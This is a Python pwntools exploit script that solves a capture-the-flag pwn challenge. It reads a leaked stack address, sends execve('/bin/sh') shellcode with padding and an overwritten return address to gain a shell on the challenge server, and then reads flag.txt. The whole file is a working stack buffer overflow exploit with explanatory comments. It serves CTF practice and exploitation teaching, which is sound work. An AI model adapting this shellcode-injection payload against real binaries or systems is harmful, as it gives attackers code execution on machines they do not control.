#!/usr/bin/env python3
from pwn import *
import sys
import re

context.log_level = "ERROR"
context.arch      = 'amd64'
context.os        = 'linux'
context.word_size = 64
context.timeout   = 1

def conn():
    if args.LOCAL:
        return process("./program")
    else:
        return remote("spooktoberctf.se", 22067)


with conn() as c:
    # "Hey, write some stuff to 0xdeadbeef"
    stuff_addr_line = c.readline().decode('ascii')
    stuff_addr = int(re.sub("^.*0x([0-9a-f]+)$", r"\1", stuff_addr_line), 16)

    print("stuff_addr: %s" % (hex(stuff_addr)), file=sys.stderr)

    # Generate execve("/bin/sh") shellcode
    payload = asm(shellcraft.amd64.linux.sh())
    # Fill stuff with junk, i.e. 128 bytes + 8 bytes where gets return value would be placed
    junk_size = (128 + 8 - len(payload))
    payload += b"A" * junk_size
    # Overwrite return address to point to the address of stuff, i.e. the execve("/bin/sh")
    payload += p64(stuff_addr)

    print("payload[%i]: %s" % (len(payload), payload), file=sys.stderr)

    # Let's goo!
    c.sendline(payload)

    # Uncomment below to run interactive shell
    #c.interactive()

    c.sendline(b"echo; cat flag.txt; exit;")
    flag = c.recvall().decode('ascii').strip()
    print(flag)

    c.close()
